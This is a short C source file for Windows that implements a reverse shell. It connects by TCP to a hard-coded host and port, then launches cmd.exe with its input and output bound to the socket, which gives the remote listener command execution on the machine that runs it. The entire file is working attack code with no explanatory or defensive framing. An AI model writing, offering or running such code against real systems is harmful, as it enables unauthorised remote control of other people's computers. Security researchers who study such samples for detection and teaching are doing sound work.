#include <winSock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <windows.h>
#pragma comment(lib, "Ws2_32.lib")

int main() {
  SOCKET rev_shell;
  sockaddr_in shell_addr;
  WSADATA wsaData;
  int connection;
  // IP address to connect to
  char IPAddress[] = "10.0.0.253";
  int port = 8080;
  char recvServer[512]; //recv server with 512 bytes
  STARTUPINFO startupInfo;
  PROCESS_INFORMATION processInfo;


  // WinSock Initialization
  WSAStartup(MAKEWORD(2, 2), &wsaData);
  // creating a tcp socket
  rev_shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);

  shell_addr.sin_port = htons(port);
  shell_addr.sin_family = AF_INET;
  shell_addr.sin_addr.s_addr = inet_addr(IPAddress);

  // connect to target listener - Microsoft Documentation
  connection = WSAConnect(rev_shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
  // Connection failed, exit program
  if(connection == SOCKET_ERROR) {
    printf("Connection Failed.. Terminating Program.");
    exit(0);
  } else { // connection succeeded
    // size: 512 Bytes
    recv(rev_shell, recvServer, sizeof(recvServer), 0);
    memset(&startupInfo, 0, sizeof(startupInfo));
    // specify cv member>: size of the structure
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) rev_shell;
    // Spawn Process, spawns cmd.exe
    CreateProcess(NULL, 
                  "cmd.exe", 
                  NULL, 
                  NULL, 
                  TRUE, 
                  0, 
                  NULL, 
                  NULL, 
                  &startupInfo, 
                  &processInfo);
    WaitForSingleObject(processInfo.hProcess, INFINITE); 
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
    memset(recvServer, 0, sizeof(recvServer));
  }
}


